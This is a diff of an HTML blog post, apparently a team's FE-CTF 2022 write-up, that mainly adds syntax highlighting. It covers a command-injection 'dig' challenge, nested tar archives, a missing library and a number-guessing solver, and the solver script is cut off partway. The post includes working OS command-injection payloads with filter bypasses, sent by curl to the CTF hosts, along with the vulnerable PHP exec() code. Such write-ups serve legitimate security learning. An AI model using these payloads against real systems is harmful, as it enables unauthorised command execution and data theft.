@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-11-01 Tue 12:42 -->
+<!-- 2022-12-09 Fri 13:37 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>FE-CTF: CyberDemon</title>
-<meta name="author" content="Main user for my machines" />
+<meta name="author" content="C3lphie" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" type="text/css" href="static/style.css" />
 <script>
@@ -93,7 +93,7 @@ This CTF was limited to a team size of 5, so me and some other admins in <a href
 We had the team name <code>0x6a75746c616e646961646d696e73</code>, which in ascii is:<br>
 </p>
 <div class="org-src-container">
-<pre class="src src-bash">echo 6a75746c616e646961646d696e73 |  xxd -r -p
+<pre class="src src-bash"><span class="org-builtin">echo</span> 6a75746c616e646961646d696e73 |  xxd -r -p
 </pre>
 </div>
 
@@ -132,7 +132,7 @@ We tested this by injecting the command <code>echo test</code> like so:<br>
 <img src="assets/2022-10-30_16-52-37_screenshot.png" alt="2022-10-30_16-52-37_screenshot.png"><br>
 We can get the flag by using the following oneliner:<br>
 </p>
-<pre class="example" id="orgd495e9d">
+<pre class="example" id="org033c10d">
 [c3lphie@laptop:~]$ curl 'http://dig-host-1-web.hack.fe-ctf.dk/html/dig_host_level1.php' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0'  --data-raw 'host=%3B+cat+%2Fflag' | grep flag | cut -d "&lt;" -f 1
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -166,7 +166,7 @@ So we changed our payload to:<br>
 <p>
 Then we can just use the following oneliner to get the flag:<br>
 </p>
-<pre class="example" id="org7f88735">
+<pre class="example" id="orgd95e6d1">
 [c3lphie@laptop:~]$ curl -X POST 'http://dig-host-2-web.hack.fe-ctf.dk/html/dig_host_level2.php' --data 'host=;cat${IFS}/flag'| grep flag | cut -d "&lt;" -f 1
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -196,7 +196,7 @@ Giving us a final payload of:<br>
 ;cat&lt;./flag
 </pre>
 
-<pre class="example" id="org4b4ac91">
+<pre class="example" id="org932a777">
 [nix-shell:~]$ curl -X POST 'http://dig-host-3-web.hack.fe-ctf.dk/html/dig_host_level3.php' --data-raw "host=;cat&lt;./flag"|grep flag | cut -d "&lt;" -f 1 | recode html..ascii
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -228,27 +228,27 @@ There are two files of interest though, the <code>dig</code> file and <code>dig_
 Content of <code>dig_host_level3.php</code>:<br>
 </p>
 <div class="org-src-container">
-<pre class="src src-php">&lt;?php
-	require_once("../include/smarty.php");
+<pre class="src src-php"><span class="org-php-php-tag">&lt;?php</span>
+	<span class="org-php-keyword">require_once</span>(<span class="org-php-string">"../include/smarty.php"</span>);
 
 
-	$host = "";
-	$output = "";
+	<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">host</span> <span class="org-php-assignment-op">=</span> <span class="org-php-string">""</span>;
+	<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">output</span> <span class="org-php-assignment-op">=</span> <span class="org-php-string">""</span>;
 
-	if(isset($_POST) &amp;&amp; is_array($_POST) &amp;&amp; array_key_exists("host", $_POST)) {
-		$host = preg_replace("/[\s\$-]+/", "", $_POST["host"]);
+	<span class="org-php-keyword">if</span>(<span class="org-php-keyword">isset</span>(<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">_POST</span>) <span class="org-php-logical-op">&amp;&amp;</span> <span class="org-php-function-call">is_array</span>(<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">_POST</span>) <span class="org-php-logical-op">&amp;&amp;</span> <span class="org-php-function-call">array_key_exists</span>(<span class="org-php-string">"host"</span>, <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">_POST</span>)) {
+		<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">host</span> <span class="org-php-assignment-op">=</span> <span class="org-php-function-call">preg_replace</span>(<span class="org-php-string">"/[\s\$-]+/"</span>, <span class="org-php-string">""</span>, <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">_POST</span>[<span class="org-php-string">"host"</span>]);
 
-		exec("/dig ".$host, $output);
+		<span class="org-php-function-call">exec</span>(<span class="org-php-string">"/dig "</span>.<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">host</span>, <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">output</span>);
 	}
 
-	$smarty-&gt;assign(array(
-		"PHP_SELF"      =&gt; $_SERVER["PHP_SELF"],
-		"host"          =&gt; $host,
-		"output"	=&gt; implode("\n", $output)
+	<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">smarty</span><span class="org-php-object-op">-&gt;</span><span class="org-php-method-call">assign</span>(<span class="org-php-keyword">array</span>(
+		<span class="org-php-string">"PHP_SELF"</span>      <span class="org-php-assignment-op">=</span><span class="org-php-comparison-op">&gt;</span> <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">_SERVER</span>[<span class="org-php-string">"PHP_SELF"</span>],
+		<span class="org-php-string">"host"</span>          <span class="org-php-assignment-op">=</span><span class="org-php-comparison-op">&gt;</span> <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">host</span>,
+		<span class="org-php-string">"output"</span>	<span class="org-php-assignment-op">=</span><span class="org-php-comparison-op">&gt;</span> <span class="org-php-function-call">implode</span>(<span class="org-php-string">"\n"</span>, <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">output</span>)
 	));
 
-	$smarty-&gt;display("dig_host_level3.tpl");
-?&gt;
+	<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">smarty</span><span class="org-php-object-op">-&gt;</span><span class="org-php-method-call">display</span>(<span class="org-php-string">"dig_host_level3.tpl"</span>);
+<span class="org-php-php-tag">?&gt;</span>
 </pre>
 </div>
 <p>
@@ -276,25 +276,25 @@ Now that we have the binary, we can examine it further using a decompiler such a
 If we look at this snippet from the decompiled main function:<br>
 </p>
 <div class="org-src-container">
-<pre class="src src-c">  if (param_1 == 2) {
+<pre class="src src-c">  <span class="org-keyword">if</span> (param_1 == 2) {
   local_1c = thunk_FUN_004010e6(&amp;local_1028);
-  for (local_1a = 0; uVar4 = (ulong)local_1a, uVar2 = thunk_FUN_004010e6(param_2[1]),
+  <span class="org-keyword">for</span> (local_1a = 0; uVar4 = (<span class="org-type">ulong</span>)local_1a, uVar2 = thunk_FUN_004010e6(param_2[1]),
       uVar4 &lt; uVar2; local_1a = local_1a + 1) {
-    if ((((*(char *)((ulong)local_1a + param_2[1]) != '\t') &amp;&amp;
-	 (*(char *)((ulong)local_1a + param_2[1]) != '\n')) &amp;&amp;
-	(*(char *)((ulong)local_1a + param_2[1]) != '\f')) &amp;&amp;
-       (((*(char *)((ulong)local_1a + param_2[1]) != '\r' &amp;&amp;
-	 (*(char *)((ulong)local_1a + param_2[1]) != ' ')) &amp;&amp;
-	((*(char *)((ulong)local_1a + param_2[1]) != '$' &amp;&amp;
-	 (*(char *)((ulong)local_1a + param_2[1]) != '&lt;')))))) {
-      *(undefined *)((long)&amp;local_1028 + (long)(int)(uint)local_1c) =
-	   *(undefined *)(param_2[1] + (ulong)local_1a);
+    <span class="org-keyword">if</span> ((((*(<span class="org-type">char</span> *)((<span class="org-type">ulong</span>)local_1a + param_2[1]) != <span class="org-string">'\t'</span>) &amp;&amp;
+	 (*(<span class="org-type">char</span> *)((<span class="org-type">ulong</span>)local_1a + param_2[1]) != <span class="org-string">'\n'</span>)) &amp;&amp;
+	(*(<span class="org-type">char</span> *)((<span class="org-type">ulong</span>)local_1a + param_2[1]) != <span class="org-string">'\f'</span>)) &amp;&amp;
+       (((*(<span class="org-type">char</span> *)((<span class="org-type">ulong</span>)local_1a + param_2[1]) != <span class="org-string">'\r'</span> &amp;&amp;
+	 (*(<span class="org-type">char</span> *)((<span class="org-type">ulong</span>)local_1a + param_2[1]) != <span class="org-string">' '</span>)) &amp;&amp;
+	((*(<span class="org-type">char</span> *)((<span class="org-type">ulong</span>)local_1a + param_2[1]) != <span class="org-string">'$'</span> &amp;&amp;
+	 (*(<span class="org-type">char</span> *)((<span class="org-type">ulong</span>)local_1a + param_2[1]) != <span class="org-string">'&lt;'</span>)))))) {
+      *(undefined *)((<span class="org-type">long</span>)&amp;local_1028 + (<span class="org-type">long</span>)(<span class="org-type">int</span>)(<span class="org-type">uint</span>)local_1c) =
+	   *(undefined *)(param_2[1] + (<span class="org-type">ulong</span>)local_1a);
       local_1c = local_1c + 1;
-      if (0xffe &lt; local_1c) break;
+      <span class="org-keyword">if</span> (0xffe &lt; local_1c) <span class="org-keyword">break</span>;
     }
   }
-  *(undefined *)((long)&amp;local_1028 + (long)(int)(uint)local_1c) = 0;
-  uVar1 = FUN_0044dce0("/bin/bash",&amp;local_1048);
+  *(undefined *)((<span class="org-type">long</span>)&amp;local_1028 + (<span class="org-type">long</span>)(<span class="org-type">int</span>)(<span class="org-type">uint</span>)local_1c) = 0;
+  uVar1 = FUN_0044dce0(<span class="org-string">"/bin/bash"</span>,&amp;local_1048);
 }
 </pre>
 </div>
@@ -302,7 +302,7 @@ If we look at this snippet from the decompiled main function:<br>
 There is a lot of input sanitization, and after that a reference to <code>/bin/bash</code>.<br>
 Next up we can run strace on the binary and see what its syscalls:<br>
 </p>
-<pre class="example" id="org5828538">
+<pre class="example" id="org4b98719">
 [nix-shell:~]$ strace ./dig_extract google.com
 execve("./dig_extract", ["./dig_extract", "google.com"], 0x7ffe10ee21b8 /* 122 vars */) = 0
 brk(NULL)                               = 0x1931000
@@ -336,7 +336,7 @@ Giving us the final payload:<br>
 <p>
 Put into the following oneliner:<br>
 </p>
-<pre class="example" id="org251e31a">
+<pre class="example" id="orgb53123b">
 [nix-shell:~]$ curl -X POST 'http://dig-host-3-web.hack.fe-ctf.dk/html/dig_host_level3.php' --data-raw "host='\`{cat,bonus_flag}\`'" | grep flag | recode html..ascii | cut -d "&gt;" -f 5- | head -n 2
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -362,7 +362,7 @@ In this challenge we were given tar file containing multiple tar files nested in
 <p>
 If we start looking at the content of the contents of the tar file we'll see that it is nested tar files:<br>
 </p>
-<pre class="example" id="org47b59e6">
+<pre class="example" id="org6c9a0e7">
 [nix-shell:~/.../fe22/tar-and-feathers]$ tar -xvf tar-and-feathers.tgz
 72
 
@@ -385,20 +385,20 @@ We could begin to extract it manually, but that would take a large amount of tim
 So we wrote a quick bash script to automate the process:<br>
 </p>
 <div class="org-src-container">
-<pre class="src src-bash">#! /usr/bin/env bash
+<pre class="src src-bash"><span class="org-comment-delimiter">#</span><span class="org-comment">! /usr/bin/</span><span class="org-keyword">env</span><span class="org-comment"> bash</span>
 
-HEX_STR=""
+<span class="org-variable-name">HEX_STR</span>=<span class="org-string">""</span>
 
-NESTED_TAR="$(tar -tf $1)"
+<span class="org-variable-name">NESTED_TAR</span>=<span class="org-string">"$(</span><span class="org-sh-quoted-exec">tar -tf $1</span><span class="org-string">)"</span>
 
-tar -xvf $1
+tar -xvf $<span class="org-variable-name">1</span>
 
-while [[ true ]]; do
-    HEX_STR+=$NESTED_TAR
-    NESTED_TAR="$(tar -xvf $NESTED_TAR)"
-    echo $HEX_STR &gt; data.hex
-    echo $HEX_STR
-done
+<span class="org-keyword">while</span> [[ true ]]; <span class="org-keyword">do</span>
+    <span class="org-variable-name">HEX_STR</span>+=$<span class="org-variable-name">NESTED_TAR</span>
+    <span class="org-variable-name">NESTED_TAR</span>=<span class="org-string">"$(</span><span class="org-sh-quoted-exec">tar -xvf $NESTED_TAR</span><span class="org-string">)"</span>
+    <span class="org-builtin">echo</span> $<span class="org-variable-name">HEX_STR</span> &gt; data.hex
+    <span class="org-builtin">echo</span> $<span class="org-variable-name">HEX_STR</span>
+<span class="org-keyword">done</span>
 </pre>
 </div>
 <p>
@@ -413,7 +413,7 @@ In order to turn the ascii hex bytes into actual bytes, we used cyberchef:<br>
 And then downloaded the result.<br>
 Examining the result using file we can that it is another tar archive:<br>
 </p>
-<pre class="example" id="orgeb512e6">
+<pre class="example" id="orge7a38e1">
 [nix-shell:~/.../fe22/tar-and-feathers]$ file download.dat
 download.dat: POSIX tar archive (GNU)
 
@@ -421,7 +421,7 @@ download.dat: POSIX tar archive (GNU)
 <p>
 So let's extract the contents of that::<br>
 </p>
-<pre class="example" id="org05af35f">
+<pre class="example" id="org853f759">
 [nix-shell:~/.../fe22/tar-and-feathers]$ tar -xvf download.dat
 runme.py
 offsets.py
@@ -433,52 +433,52 @@ top.png
 The file <code>runme.py</code> has the following content:<br>
 </p>
 <div class="org-src-container">
-<pre class="src src-python">#!/usr/bin/env python3
-import os
-import sys
-import subprocess
-from offsets import offsets
+<pre class="src src-python"><span class="org-comment-delimiter">#</span><span class="org-comment">!/usr/bin/env python3</span>
+<span class="org-py-import-from">import</span> os
+<span class="org-py-import-from">import</span> sys
+<span class="org-py-import-from">import</span> subprocess
+<span class="org-py-import-from">from</span> offsets <span class="org-py-import-from">import</span> offsets
 
-if len(sys.argv) != 2:
-    print(f'Usage: {sys.argv[0]} &lt;outfile&gt;', file=sys.stderr)
-    exit(-1)
+<span class="org-keyword">if</span> <span class="org-py-builtins">len</span>(sys.argv) != <span class="org-py-variable-name">2</span>:
+    <span class="org-keyword">print</span>(f<span class="org-string">'Usage: </span><span class="org-py-variable-name">{sys.argv[0]}</span><span class="org-string"> &lt;outfile&gt;'</span>, <span class="org-py-builtins">file</span>=sys.stderr)
+    exit(-<span class="org-py-number">1</span>)
 
-INIT = 'tar-and-feathers.tgz'
+<span class="org-py-variable-name">INIT</span> = <span class="org-string">'tar-and-feathers.tgz'</span>
 
-def run(cmd):
-    return subprocess.check_output(cmd, shell=True)
+<span class="org-py-def-class">def</span> <span class="org-py-def">run</span>(cmd):
+    <span class="org-keyword">return</span> subprocess.check_output(cmd, shell=<span class="org-py-pseudo-keyword">True</span>)
 
-def unpack1(name):
-    filemagic = run(f'file {name}')
-    if b'bzip2' in filemagic:
-	run(f'mv {name} {name}.bz2')
-	run(f'bunzip2 {name}.bz2')
-	return unpack1(name)
-    return run(f'tar xfv {name}').strip().decode()
+<span class="org-py-def-class">def</span> <span class="org-py-def">unpack1</span>(name):
+    <span class="org-py-variable-name">filemagic</span> = run(f<span class="org-string">'file </span><span class="org-py-variable-name">{name}</span><span class="org-string">'</span>)
+    <span class="org-keyword">if</span> b<span class="org-string">'bzip2'</span> <span class="org-keyword">in</span> <span class="org-py-variable-name">filemagic</span>:
+	run(f<span class="org-string">'mv </span><span class="org-py-variable-name">{name}</span><span class="org-string"> </span><span class="org-py-variable-name">{name}</span><span class="org-string">.bz2'</span>)
+	run(f<span class="org-string">'bunzip2 </span><span class="org-py-variable-name">{name}</span><span class="org-string">.bz2'</span>)
+	<span class="org-keyword">return</span> unpack1(name)
+    <span class="org-keyword">return</span> run(f<span class="org-string">'tar xfv </span><span class="org-py-variable-name">{name}</span><span class="org-string">'</span>).strip().decode()
 
-def getbyte(n):
-    print(f'getbyte({n}) = ', end='', file=sys.stderr, flush=True)
-    prev = None
-    for _ in range(n + 1):
-	next = unpack1(prev or INIT)
-	if prev and prev != next:
+<span class="org-py-def-class">def</span> <span class="org-py-def">getbyte</span>(n):
+    <span class="org-keyword">print</span>(f<span class="org-string">'getbyte(</span><span class="org-py-variable-name">{n}</span><span class="org-string">) = '</span>, end=<span class="org-string">''</span>, <span class="org-py-builtins">file</span>=sys.stderr, flush=<span class="org-py-pseudo-keyword">True</span>)
+    <span class="org-py-variable-name">prev</span> = <span class="org-py-pseudo-keyword">None</span>
+    <span class="org-keyword">for</span> <span class="org-py-builtins">_</span> <span class="org-keyword">in</span> <span class="org-py-builtins">range</span>(n + <span class="org-py-number">1</span>):
+	<span class="org-py-builtins">next</span> = unpack1(prev <span class="org-keyword">or</span> INIT)
+	<span class="org-keyword">if</span> prev <span class="org-keyword">and</span> prev != <span class="org-py-builtins">next</span>:
 	    os.unlink(prev)
-	try:
-	    byte = int(next, 16)
-	except:
-	    os.unlink(next)
-	    raise
-	prev = next
-    os.unlink(next)
-    print(f'0x{byte:02x}', file=sys.stderr)
-    return byte
+	<span class="org-py-try-if">try</span>:
+	    <span class="org-py-variable-name">byte</span> = <span class="org-py-builtins">int</span>(<span class="org-py-builtins">next</span>, <span class="org-py-number">16</span>)
+	<span class="org-keyword">except</span>:
+	    os.unlink(<span class="org-py-builtins">next</span>)
+	    <span class="org-keyword">raise</span>
+	<span class="org-py-variable-name">prev</span> = <span class="org-py-builtins">next</span>
+    os.unlink(<span class="org-py-builtins">next</span>)
+    <span class="org-keyword">print</span>(f<span class="org-string">'0x</span><span class="org-py-variable-name">{byte:02x}</span><span class="org-string">'</span>, <span class="org-py-builtins">file</span>=sys.stderr)
+    <span class="org-keyword">return</span> byte
 
-def unpack(path):
-    data = bytes(getbyte(offset) for offset in offsets)
-    with file(path, 'wb') as fd:
+<span class="org-py-def-class">def</span> <span class="org-py-def">unpack</span>(path):
+    <span class="org-py-variable-name">data</span> = <span class="org-py-builtins">bytes</span>(getbyte(offset) <span class="org-keyword">for</span> offset <span class="org-keyword">in</span> offsets)
+    <span class="org-keyword">with</span> <span class="org-py-builtins">file</span>(path, <span class="org-string">'wb'</span>) <span class="org-keyword">as</span> <span class="org-py-variable-name">fd</span>:
 	fd.write(data)
 
-unpack(sys.argv[1])
+unpack(sys.argv[<span class="org-py-number">1</span>])
 </pre>
 </div>
 
@@ -491,13 +491,13 @@ Luckily we already have all the bytes and the offsets!<br>
 So we created this small python script to extract the bytes at our given offsets:<br>
 </p>
 <div class="org-src-container">
-<pre class="src src-python">from offsets import offsets
+<pre class="src src-python"><span class="org-py-import-from">from</span> offsets <span class="org-py-import-from">import</span> offsets
 
-data = open("download.dat", "rb").read()
+<span class="org-py-variable-name">data</span> = <span class="org-py-builtins">open</span>(<span class="org-string">"download.dat"</span>, <span class="org-string">"rb"</span>).read()
 
-ndata = bytes(data[offset] for offset in offsets)
+<span class="org-py-variable-name">ndata</span> = <span class="org-py-builtins">bytes</span>(data[offset] <span class="org-keyword">for</span> offset <span class="org-keyword">in</span> offsets)
 
-with open("out.bin", "wb") as f:
+<span class="org-keyword">with</span> <span class="org-py-builtins">open</span>(<span class="org-string">"out.bin"</span>, <span class="org-string">"wb"</span>) <span class="org-keyword">as</span> <span class="org-py-variable-name">f</span>:
     f.write(ndata)
 </pre>
 </div>
@@ -505,7 +505,7 @@ with open("out.bin", "wb") as f:
 <p>
 Running the script and checking the output:<br>
 </p>
-<pre class="example" id="org1da05ea">
+<pre class="example" id="org75a68ec">
 [nix-shell:~/.../fe22/tar-and-feathers]$ python unpack.py
 
 [nix-shell:~/.../fe22/tar-and-feathers]$ file out.bin
@@ -538,7 +538,7 @@ In this challenge we were provided with a binary that was missing library file.<
 <p>
 We can look at the needed libraries with <code>patchelf</code>:<br>
 </p>
-<pre class="example" id="orgd12687d">
+<pre class="example" id="org11a3c47">
 [nix-shell:~/.../fe22/libnotfound]$ patchelf --print-needed challenge
 libnotfound.so
 libc.so.6
@@ -551,39 +551,39 @@ And looking closer at the main function we see a lot of asserts for functions fr
 </p>
 <div class="org-src-container">
 <pre class="src src-c">  iVar1 = foo_add(0x19,0x11);
-if (iVar1 != 0x2a) {
-		  /* WARNING: Subroutine does not return */
-  __assert_fail("foo_add(25, 17) == 42","main.c",0x18,"main");
+<span class="org-keyword">if</span> (iVar1 != 0x2a) {
+		  <span class="org-comment-delimiter">/* </span><span class="org-comment">WARNING: Subroutine does not return</span><span class="org-comment-delimiter"> */</span>
+  __assert_fail(<span class="org-string">"foo_add(25, 17) == 42"</span>,<span class="org-string">"main.c"</span>,0x18,<span class="org-string">"main"</span>);
 }
 iVar1 = foo_add(0x2c,0xfffffffe);
-if (iVar1 != 0x2a) {
-		  /* WARNING: Subroutine does not return */
-  __assert_fail("foo_add(44, -2) == 42","main.c",0x19,"main");
+<span class="org-keyword">if</span> (iVar1 != 0x2a) {
+		  <span class="org-comment-delimiter">/* </span><span class="org-comment">WARNING: Subroutine does not return</span><span class="org-comment-delimiter"> */</span>
+  __assert_fail(<span class="org-string">"foo_add(44, -2) == 42"</span>,<span class="org-string">"main.c"</span>,0x19,<span class="org-string">"main"</span>);
 }
 iVar1 = foo_sub(0x35,0xb);
-if (iVar1 != 0x2a) {
-		  /* WARNING: Subroutine does not return */
-  __assert_fail("foo_sub(53, 11) == 42","main.c",0x1a,"main");
+<span class="org-keyword">if</span> (iVar1 != 0x2a) {
+		  <span class="org-comment-delimiter">/* </span><span class="org-comment">WARNING: Subroutine does not return</span><span class="org-comment-delimiter"> */</span>
+  __assert_fail(<span class="org-string">"foo_sub(53, 11) == 42"</span>,<span class="org-string">"main.c"</span>,0x1a,<span class="org-string">"main"</span>);
 }
 iVar1 = foo_sub(0x27,0xfffffffd);
-if (iVar1 != 0x2a) {
-		  /* WARNING: Subroutine does not return */
-  __assert_fail("foo_sub(39, -3) == 42","main.c",0x1b,"main");
+<span class="org-keyword">if</span> (iVar1 != 0x2a) {
+		  <span class="org-comment-delimiter">/* </span><span class="org-comment">WARNING: Subroutine does not return</span><span class="org-comment-delimiter"> */</span>
+  __assert_fail(<span class="org-string">"foo_sub(39, -3) == 42"</span>,<span class="org-string">"main.c"</span>,0x1b,<span class="org-string">"main"</span>);
 }
 iVar1 = foo_mul(0x15,2);
-if (iVar1 != 0x2a) {
-		  /* WARNING: Subroutine does not return */
-  __assert_fail("foo_mul(21, 2) == 42","main.c",0x1c,"main");
+<span class="org-keyword">if</span> (iVar1 != 0x2a) {
+		  <span class="org-comment-delimiter">/* </span><span class="org-comment">WARNING: Subroutine does not return</span><span class="org-comment-delimiter"> */</span>
+  __assert_fail(<span class="org-string">"foo_mul(21, 2) == 42"</span>,<span class="org-string">"main.c"</span>,0x1c,<span class="org-string">"main"</span>);
 }
 iVar1 = foo_div(0x7e,3);
-if (iVar1 != 0x2a) {
-		  /* WARNING: Subroutine does not return */
-  __assert_fail("foo_div(126, 3) == 42","main.c",0x1d,"main");
+<span class="org-keyword">if</span> (iVar1 != 0x2a) {
+		  <span class="org-comment-delimiter">/* </span><span class="org-comment">WARNING: Subroutine does not return</span><span class="org-comment-delimiter"> */</span>
+  __assert_fail(<span class="org-string">"foo_div(126, 3) == 42"</span>,<span class="org-string">"main.c"</span>,0x1d,<span class="org-string">"main"</span>);
 }
 iVar1 = foo_mod(0x114,0x75);
-if (iVar1 != 0x2a) {
-		  /* WARNING: Subroutine does not return */
-  __assert_fail("foo_mod(276, 117) == 42","main.c",0x1e,"main");
+<span class="org-keyword">if</span> (iVar1 != 0x2a) {
+		  <span class="org-comment-delimiter">/* </span><span class="org-comment">WARNING: Subroutine does not return</span><span class="org-comment-delimiter"> */</span>
+  __assert_fail(<span class="org-string">"foo_mod(276, 117) == 42"</span>,<span class="org-string">"main.c"</span>,0x1e,<span class="org-string">"main"</span>);
 }
 </pre>
 </div>
@@ -593,32 +593,32 @@ Meaning we have to implement those into our own version of the library.<br>
 This was done using the following C code:<br>
 </p>
 <div class="org-src-container">
-<pre class="src src-c">#ifndef __libnotfound_H
-#define __libnotfound_H
+<pre class="src src-c"><span class="org-preprocessor">#if</span><span class="org-negation-char"><span class="org-preprocessor">n</span></span><span class="org-preprocessor">def</span> __libnotfound_H
+<span class="org-preprocessor">#define</span> <span class="org-variable-name">__libnotfound_H</span>
 
-extern int foo_add(long a, long b) {
-  return a + b;
+<span class="org-keyword">extern</span> <span class="org-type">int</span> <span class="org-function-name">foo_add</span>(<span class="org-type">long</span> <span class="org-variable-name">a</span>, <span class="org-type">long</span> <span class="org-variable-name">b</span>) {
+  <span class="org-keyword">return</span> a + b;
 }
 
-extern int foo_sub(int a, int b){
-  return a - b;
+<span class="org-keyword">extern</span> <span class="org-type">int</span> <span class="org-function-name">foo_sub</span>(<span class="org-type">int</span> <span class="org-variable-name">a</span>, <span class="org-type">int</span> <span class="org-variable-name">b</span>){
+  <span class="org-keyword">return</span> a - b;
 }
 
-extern int foo_mul(int a, int b){
-  return a * b;
+<span class="org-keyword">extern</span> <span class="org-type">int</span> <span class="org-function-name">foo_mul</span>(<span class="org-type">int</span> <span class="org-variable-name">a</span>, <span class="org-type">int</span> <span class="org-variable-name">b</span>){
+  <span class="org-keyword">return</span> a * b;
 }
 
-extern int foo_div(int a, int b){
-  float fa = (float) a;
-  float fb = (float) b;
-  return (int) fa/fb;
+<span class="org-keyword">extern</span> <span class="org-type">int</span> <span class="org-function-name">foo_div</span>(<span class="org-type">int</span> <span class="org-variable-name">a</span>, <span class="org-type">int</span> <span class="org-variable-name">b</span>){
+  <span class="org-type">float</span> <span class="org-variable-name">fa</span> = (<span class="org-type">float</span>) a;
+  <span class="org-type">float</span> <span class="org-variable-name">fb</span> = (<span class="org-type">float</span>) b;
+  <span class="org-keyword">return</span> (<span class="org-type">int</span>) fa/fb;
 }
 
-extern int foo_mod(int a, int b){
-  return a % b;
+<span class="org-keyword">extern</span> <span class="org-type">int</span> <span class="org-function-name">foo_mod</span>(<span class="org-type">int</span> <span class="org-variable-name">a</span>, <span class="org-type">int</span> <span class="org-variable-name">b</span>){
+  <span class="org-keyword">return</span> a % b;
 }
 
-#endif
+<span class="org-preprocessor">#endif</span>
 </pre>
 </div>
 
@@ -642,7 +642,7 @@ patchelf --replace-needed libnotfound.so ./src/libnotfound.so challenge
 <p>
 We can then check it like this:<br>
 </p>
-<pre class="example" id="orgb1f900f">
+<pre class="example" id="orge2dd2d1">
 [nix-shell:~/.../fe22/libnotfound]$ patchelf --print-needed challenge
 ./src/libnotfound.so
 libc.so.6
@@ -652,7 +652,7 @@ libc.so.6
 <p>
 And then get the flag by running the binary:<br>
 </p>
-<pre class="example" id="org610d05c">
+<pre class="example" id="org9329706">
 [nix-shell:~/.../fe22/libnotfound]$ ./challenge
 flag{hello? yes, this is flag}
 </pre>
@@ -665,7 +665,7 @@ flag{hello? yes, this is flag}
 In this challenge we were basically only given a domain and port.<br>
 Connecting to it with netcat, we get the following message:<br>
 </p>
-<pre class="example" id="orgf8f7853">
+<pre class="example" id="org1ec3013">
 [nix-shell:~/.../fe22/guess]$ nc guess.hack.fe-ctf.dk 1337
 == proof-of-work: disabled ==
  == Welcome to Number Guess ==
@@ -730,93 +730,93 @@ And after many failed attempts we finally got the flag:<br>
 Final solve script:<br>
 </p>
 <div class="org-src-container">
-<pre class="src src-python">from pwn import *
-import math
+<pre class="src src-python"><span class="org-py-import-from">from</span> pwn <span class="org-py-import-from">import</span> *
+<span class="org-py-import-from">import</span> math
 
-from multiprocessing import Pool
+<span class="org-py-import-from">from</span> multiprocessing <span class="org-py-import-from">import</span> Pool
 
-def guess(guess: int):
-    try:
-	res = io.readuntil("Your guess:")
-	io.sendline(str(guess).encode())
-	res = io.readuntil("\n")
-	return res.decode()
-    except:
-	res = io.readline()
-	return res.decode()
+<span class="org-py-def-class">def</span> <span class="org-py-def">guess</span>(guess: <span class="org-py-builtins">int</span>):
+    <span class="org-py-try-if">try</span>:
+	<span class="org-py-variable-name">res</span> = io.readuntil(<span class="org-string">"Your guess:"</span>)
+	io.sendline(<span class="org-py-builtins">str</span>(guess).encode())
+	<span class="org-py-variable-name">res</span> = io.readuntil(<span class="org-string">"\n"</span>)
+	<span class="org-keyword">return</span> res.decode()
+    <span class="org-keyword">except</span>:
+	<span class="org-py-variable-name">res</span> = io.readline()
+	<span class="org-keyword">return</span> res.decode()
 
-def calc_perc(guess_left, guess_high_left):
-    return (guess_high_left + 1) / guess_left
+<span class="org-py-def-class">def</span> <span class="org-py-def">calc_perc</span>(guess_left, guess_high_left):
+    <span class="org-keyword">return</span> (guess_high_left + <span class="org-py-number">1</span>) / guess_left
 
 
-def strategy(_round):
-    min_max = [0, 4000000]
-    guess_left = total_guesses
-    guess_low_left = total_guesses - too_high
-    guess_high_left = too_high
+<span class="org-py-def-class">def</span> <span class="org-py-def">strategy</span>(_round):
+    <span class="org-py-variable-name">min_max</span> = [<span class="org-py-number">0</span>, <span class="org-py-number">4000000</span>]
+    <span class="org-py-variable-name">guess_left</span> = total_guesses
+    <span class="org-py-variable-name">guess_low_left</span> = total_guesses - too_high
+    <span class="org-py-variable-name">guess_high_left</span> = too_high
 
-    while True:
-	log.info(f"============{_round}=============")
-	_range = min_max[1] - min_max[0]
+    <span class="org-keyword">while</span> <span class="org-py-pseudo-keyword">True</span>:
+	log.info(f<span class="org-string">"============</span><span class="org-py-variable-name">{_round}</span><span class="org-string">============="</span>)
+	<span class="org-py-variable-name">_range</span> = min_max[<span class="org-py-number">1</span>] - min_max[<span class="org-py-number">0</span>]
 
-	try:
-	    perc = calc_perc(guess_low_left, guess_high_left)
-	    if perc != 0:
-		_guess = math.floor(_range * perc) + min_max[0]
-	    elif perc == 1:
-		_guess = min_max[0]
-	    else:
-		_guess = min_max[0] +1
+	<span class="org-py-try-if">try</span>:
+	    <span class="org-py-variable-name">perc</span> = calc_perc(guess_low_left, guess_high_left)
+	    <span class="org-keyword">if</span> perc != <span class="org-py-variable-name">0</span>:
+		<span class="org-py-variable-name">_guess</span> = math.floor(_range * perc) + min_max[<span class="org-py-number">0</span>]
+	    <span class="org-keyword">elif</span> <span class="org-py-variable-name">perc</span> == <span class="org-py-variable-name">1</span>:
+		<span class="org-py-variable-name">_guess</span> = min_max[<span class="org-py-number">0</span>]
+	    <span class="org-keyword">else</span>:
